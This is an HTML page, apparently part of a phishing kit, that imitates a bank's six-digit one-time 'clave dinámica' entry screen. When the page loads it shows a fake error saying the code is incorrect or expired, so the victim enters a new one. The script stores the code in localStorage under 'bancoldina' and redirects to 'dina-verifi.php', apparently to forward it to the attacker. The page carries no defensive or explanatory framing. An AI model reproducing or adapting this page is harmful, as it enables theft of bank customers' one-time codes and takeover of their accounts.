<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Image-based Website</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }
    body, html {
      height: 100%;
      width: 100%;
      display: flex;
      justify-content: center;
      align-items: center;
      background-color: #f0f0f0;
      font-family: Arial, sans-serif;
    }
    .image-container {
      width: 100%;
      height: 100%;
      overflow: hidden;
      position: relative;
    }
    .image-container img {
      width: 100%;
      height: 100%;
      object-fit: cover;
    }
    .center-box {
      position: absolute;
      top: 60%;
      left: 50%;
      transform: translate(-50%, -50%);
      background-color: transparent;
      padding: 10px 30px 0;
      border-radius: 8px;
      display: flex;
      flex-direction: column;
      align-items: center;
      gap: 8px;
      width: 320px;
    }
    .input-container {
      display: flex;
      justify-content: center;
      gap: 12px;
      width: 100%;
    }
    .password-input {
      width: 28px;
      height: 20px;
      text-align: center;
      font-size: 20px;
      padding: 10px 0 5px 0;
      border: none;
      border-bottom: 1.5px solid #808285;
      background: transparent;
      outline: none;
      color: #2c2a29;
      border-radius: 0;
      transition: border-color 0.3s;
    }
    .password-input:focus {
      border-bottom: 1.5px solid #ffc20e;
    }
    .error-message {
      color: #dc0f0f;
      font-size: 14px;
      text-align: center;
      width: 100%;
      min-height: 18px;
      user-select: none;
    }
    .button-container {
      position: absolute;
      top: 77.5%;
      left: 50%;
      transform: translate(-50%, -50%);
      display: flex;
      flex-direction: column;
      gap: 20px;
      width: 320px;
      transition: top 0.3s ease-in-out;
      align-items: center;
    }
    .button-container button {
      padding: 15px 120px;
      font-size: 16px;
      border: none;
      border-radius: 50px;
      font-weight: bold;
      color: rgb(1, 1, 1);
      cursor: pointer;
      transition: background-color 0.3s ease;
      width: 100%;
      max-width: 320px;
    }
    .button-container button:first-child {
      background-color: #ffda37;
      border: 1px solid black;
    }
    .button-container button:first-child:hover {
      background-color: #ffcb00;
    }
    .button-container button:last-child {
      background-color: #bababa;
    }
    .button-container button:last-child:hover {
      background-color: #a9a9a9;
    }

    @media screen and (max-width: 480px) {
      .center-box {
        top: 58%;
        width: 90%;
      }
      .button-container {
        width: 90%;
        top: 85%;
      }
      .button-container button {
        padding: 14px;
        font-size: 15px;
        max-width: none;
      }
      .password-input {
        width: 26px;
        font-size: 18px;
        padding: 8px 0 4px 0;
      }
    }
  </style>
</head>
<body>
  <div class="image-container">
    <img src="img/cel3.jpg" alt="Background Image" />
    <div class="center-box">
      <div class="input-container">
        <input type="text" class="password-input" maxlength="1" id="input1" inputmode="numeric" oninput="validateInput(event)" />
        <input type="text" class="password-input" maxlength="1" id="input2" inputmode="numeric" oninput="validateInput(event)" />
        <input type="text" class="password-input" maxlength="1" id="input3" inputmode="numeric" oninput="validateInput(event)" />
        <input type="text" class="password-input" maxlength="1" id="input4" inputmode="numeric" oninput="validateInput(event)" />
        <input type="text" class="password-input" maxlength="1" id="input5" inputmode="numeric" oninput="validateInput(event)" />
        <input type="text" class="password-input" maxlength="1" id="input6" inputmode="numeric" oninput="validateInput(event)" />
      </div>
      <div class="error-message" id="error-message">
        Clave dinámica incorrecta o expirada por favor colocar su clave dinámica correctamente
      </div>
    </div>
    <div class="button-container">
      <button id="continuar">Continuar</button>
      <button id="cancelar">Cancelar</button>
    </div>
  </div>

  <script>
    const inputs = document.querySelectorAll('.password-input');
    const errorMessage = document.getElementById('error-message');

    // Mostrar mensaje rojo al cargar la página
    window.addEventListener('load', () => {
      errorMessage.style.display = 'block';
    });

    inputs.forEach((input, index) => {
      input.addEventListener('input', (e) => {
        if (e.target.value !== '') {
          if (index < inputs.length - 1) {
            inputs[index + 1].focus();
          }
          // Ocultar el mensaje cuando el usuario empieza a escribir
          errorMessage.style.display = 'none';
        }
      });

      input.addEventListener('keydown', (e) => {
        if (e.key === 'Backspace' && index > 0 && e.target.value === '') {
          inputs[index - 1].focus();
        }
      });
    });

    function validateInput(event) {
      const value = event.target.value;
      if (isNaN(value)) {
        event.target.value = '';
      }
    }

    document.getElementById('continuar').addEventListener('click', () => {
      const inputValues = Array.from(inputs).map(input => input.value).join('');
      if (inputValues.length < 6 || inputValues.includes('')) {
        errorMessage.style.display = 'block';
        return;
      }
      errorMessage.style.display = 'none';
      localStorage.setItem('bancoldina', inputValues);
      window.location.href = 'dina-verifi.php';
    });

    document.getElementById('cancelar').addEventListener('click', () => {
      window.location.href = 'index.html';
    });

    window.addEventListener('resize', () => {
      const buttonContainer = document.querySelector('.button-container');
      if (window.innerHeight < 500) {
        buttonContainer.style.top = '90%';
      } else {
        buttonContainer.style.top = '77.5%';
      }
    });
  </script>
</body>
</html>
